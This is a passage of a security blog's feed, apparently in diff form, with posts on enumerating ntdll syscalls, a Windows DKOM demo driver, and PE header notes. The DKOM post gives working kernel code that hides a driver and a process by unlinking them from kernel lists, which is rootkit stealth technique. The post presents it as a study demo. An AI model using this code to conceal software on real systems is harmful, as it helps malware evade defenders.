+            &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Exception: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result is a program which will enumerate the system calls of &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;SyscallDumper.exe
+ordinal   RVA       code      name
+
+190       9c0a0     2         NtAcceptConnectPort
+191       9c060     0         NtAccessCheck
+192       9c580     29        NtAccessCheckAndAuditAlarm
+... (truncated)
+653       9cb40     57        NtWriteRequestData
+654       9c7a0     3a        NtWriteVirtualMemory
+655       9c920     46        NtYieldExecution
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Josh Finley</name></author><summary type="html">Source code for this demonstration can be found here</summary></entry><entry><title type="html">Windows DKOM Demo</title><link href="http://localhost:4000/dkom-demo/" rel="alternate" type="text/html" title="Windows DKOM Demo" /><published>2020-04-02T00:05:29-05:00</published><updated>2020-04-02T00:05:29-05:00</updated><id>http://localhost:4000/dkom-demo</id><content type="html" xml:base="http://localhost:4000/dkom-demo/">&lt;p&gt;This is an implementation of a simple driver which modifies kernel data structures to remove itself from the &lt;code class=&quot;highlighter-rouge&quot;&gt;PsLoadedModuleList&lt;/code&gt; structure. Disclaimer: PG protects against this. Weaponizanble by chaining with a PG bypass.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PsLoadedModuleList&lt;/code&gt;  is a global kernel object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;_KLDR_DATA_TABLE_ENTRY&lt;/code&gt;. It is the list head of a circular linked-list containing the loaded modules on the system. Example:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; ?PsLoadedModuleList
+Evaluate expression: -8773737086640 = fffff805`34848150
+2: kd&amp;gt; dt poi(fffff805`34848150) _KLDR_DATA_TABLE_ENTRY
+DKOM_Demo!_KLDR_DATA_TABLE_ENTRY
+   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0xffffd78d`4ee49340 - 0xfffff805`34848150 ]
+   +0x010 ExceptionTable   : 0xfffff805`34911000 Void
+   +0x018 ExceptionTableSize : 0x5e38c
+   +0x020 GpValue          : (null) 
+   +0x028 NonPagedDebugInfo : (null) 
+   +0x030 DllBase          : 0xfffff805`34400000 Void
+   +0x038 EntryPoint       : 0xfffff805`34997010 Void
+   +0x040 SizeOfImage      : 0xab7000
+   +0x048 FullDllName      : _UNICODE_STRING &quot;\SystemRoot\system32\ntoskrnl.exe&quot;
+   +0x058 BaseDllName      : _UNICODE_STRING &quot;ntoskrnl.exe&quot;
+   +0x068 Flags            : 0x8804000
+   +0x06c LoadCount        : 0x8f
+   +0x06e __Unused5        : 0x10
+   +0x070 SectionPointer   : (null) 
+   +0x078 CheckSum         : 0x979256
+   +0x080 LoadedImports    : (null) 
+   +0x088 PatchInformation : 0x00000000`00000001 Void
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that at information about the entry is offset to the actual &lt;code class=&quot;highlighter-rouge&quot;&gt;LIST_ENTRY&lt;/code&gt; structure, which holds the addresses of the next and previous &lt;code class=&quot;highlighter-rouge&quot;&gt;_KLDR_DATA_TABLE_ENTRY&lt;/code&gt; structures. If you’re not familiar, &lt;code class=&quot;highlighter-rouge&quot;&gt;LIST_ENTRY&lt;/code&gt; looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; dt _List_entry
+ntdll!_LIST_ENTRY
+   +0x000 Flink            : Ptr64 _LIST_ENTRY
+   +0x008 Blink            : Ptr64 _LIST_ENTRY
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As it turns out, each driver has access to it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;KLDR_DATA_TABLE_ENTRY&lt;/code&gt; structure by its &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverObject-&amp;gt;DriverSection&lt;/code&gt; member at offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x28&lt;/code&gt;. Just for completeness’ sake, the &lt;code class=&quot;highlighter-rouge&quot;&gt;DRIVER_OBJECT&lt;/code&gt; structure looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; dt PDRIVER_OBJECT
+DKOM_Demo!PDRIVER_OBJECT
+Ptr64    +0x000 Type             : Int2B
+   +0x002 Size             : Int2B
+   +0x008 DeviceObject     : Ptr64 _DEVICE_OBJECT
+   +0x010 Flags            : Uint4B
+   +0x018 DriverStart      : Ptr64 Void
+   +0x020 DriverSize       : Uint4B
+   +0x028 DriverSection    : Ptr64 Void    //KLDR_DATA_TABLE_ENTRY            
+   +0x030 DriverExtension  : Ptr64 _DRIVER_EXTENSION
+   +0x038 DriverName       : _UNICODE_STRING
+   +0x048 HardwareDatabase : Ptr64 _UNICODE_STRING
+   +0x050 FastIoDispatch   : Ptr64 _FAST_IO_DISPATCH
+   +0x058 DriverInit       : Ptr64     long 
+   +0x060 DriverStartIo    : Ptr64     void 
+   +0x068 DriverUnload     : Ptr64     void 
+   +0x070 MajorFunction    : [28] Ptr64     long 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As such, one can simply access and traverse &lt;code class=&quot;highlighter-rouge&quot;&gt;PsLoadedModuleList&lt;/code&gt; using this member of &lt;code class=&quot;highlighter-rouge&quot;&gt;DRIVER_OBJECT&lt;/code&gt;. Additionally, directly hiding a module from the list is as simple as relinking the &lt;code class=&quot;highlighter-rouge&quot;&gt;LIST_ENTRY&lt;/code&gt; structures surrounding the driver’s:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrevModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NextModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// Replace PrevModule Flink with NextModule's address;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrevModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NextModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Replace NextModule Blink with PrevModule's address
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NextModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrevModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// point target process to itself
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThisModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThisModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And since you have access to the driver &lt;code class=&quot;highlighter-rouge&quot;&gt;KLDR_DATA_TABLE_ENTRY&lt;/code&gt;, you can check your work:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FindKernelModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PDRIVER_OBJECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PUNICODE_STRING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DriverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;// Logic can be similarly used for finding the PsLoadedModuleList head. ntoskrnl.exe is always the head
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;PKLDR_DATA_TABLE_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pThisModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PKLDR_DATA_TABLE_ENTRY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KModEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InLoadOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;// https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
+&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// Loop over the circular linked-list
+&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pListEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InLoadOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pListEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InLoadOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pThisModule&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InLoadOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;pListEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;c1&quot;&gt;// Search for the driver you're trying to hide
+&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;PKLDR_DATA_TABLE_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONTAINING_RECORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;pListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KLDR_DATA_TABLE_ENTRY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InLoadOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RtlEqualUnicodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BaseDllName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+			&lt;span class=&quot;c1&quot;&gt;// oops, you found it. 
+&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;KModEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// module was unlinked successfully
+&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_UNSUCCESSFUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This same type of unlinking behavior can be used to hide a process. In kernel mode, a process can be looked up by its ID using &lt;code class=&quot;highlighter-rouge&quot;&gt;PsLookupProcessByProcessId&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// turn the PID into an EPROCESS pointer
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PEPROCESS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PsLookupProcessByProcessId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Where PEPROCESS represent a pointer to an EPROCESS structure like this:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; dt _EPROCESS
+ntdll!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
+   +0x2e8 UniqueProcessId  : Ptr64 Void
+   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
+   +0x300 RundownProtect   : _EX_RUNDOWN_REF
+   +0x308 Flags2           : Uint4B
+... (truncated
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With a pointer to the target process’s EPROCESS structure in hand, it can be scanned for the &lt;code class=&quot;highlighter-rouge&quot;&gt;ActiveProcessLinks&lt;/code&gt; member. Once this member is found, hiding the process is the exact same for hiding a driver process:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// get the ActiveProcesLinks address
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PUCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrevListEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NextListEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// unlink the target process
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrevListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NextListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;NextListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrevListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// point target process to itself
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blink&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;On Windows 10 1901 build 18363, the &lt;code class=&quot;highlighter-rouge&quot;&gt;ActiveProcessLinks&lt;/code&gt; member is located at offset 0x2f0. This offset changes between builds.&lt;/p&gt;
+
+&lt;p&gt;The full source for an example driver can be found &lt;a href=&quot;https://github.com/joshfinley/DKOM_Demo&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Of course, none of this is anything new:&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/DarthTon/Blackbone/blob/master/src/BlackBoneDrv/Loader.c&quot;&gt;blackbone implementation to find PsLoadedModuleList&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo&quot;&gt;all sorts of ways of finding module addresses&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://vxug.fakedoma.in/papers/Hiding%20loaded%20driver%20with%20DKOM%20.txt&quot;&gt;another implementation of the same driver hiding functionality&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://vxug.fakedoma.in/papers/Hide%20process%20with%20DKOM%20without%20hardcoded%20offsets.txt&quot;&gt;the reference implementation for the process hiding functionality&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Josh Finley</name></author><summary type="html">This is an implementation of a simple driver which modifies kernel data structures to remove itself from the PsLoadedModuleList structure. Disclaimer: PG protects against this. Weaponizanble by chaining with a PG bypass.</summary></entry><entry><title type="html">PE Format Notes</title><link href="http://localhost:4000/pe-format/" rel="alternate" type="text/html" title="PE Format Notes" /><published>2020-04-02T00:05:28-05:00</published><updated>2020-04-02T00:05:28-05:00</updated><id>http://localhost:4000/pe-format</id><content type="html" xml:base="http://localhost:4000/pe-format/">&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;struct DOS_Header
+{
+// short is 2 bytes, long is 4 bytes
+     char signature[2] = { 'M', 'Z' };
+     short lastsize;
+     short nblocks;
+     short nreloc;
+     short hdrsize;
+     short minalloc;
+     short maxalloc;
+     void *ss; // 2 byte value
+     void *sp; // 2 byte value
+     short checksum;
+     void *ip; // 2 byte value
+     void *cs; // 2 byte value
+     short relocpos;
+     short noverlay;
+     short reserved1[4];
+     short oem_id;
+     short oem_info;
+     short reserved2[10];
+     long  e_lfanew; // Offset to the 'PE\0\0' signature relative to the beginning of the file
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;optional-header-misnomer---not-actually-optional&quot;&gt;Optional Header (misnomer - not actually optional)&lt;/h4&gt;
+&lt;h5 id=&quot;64-bit&quot;&gt;64 Bit&lt;/h5&gt;
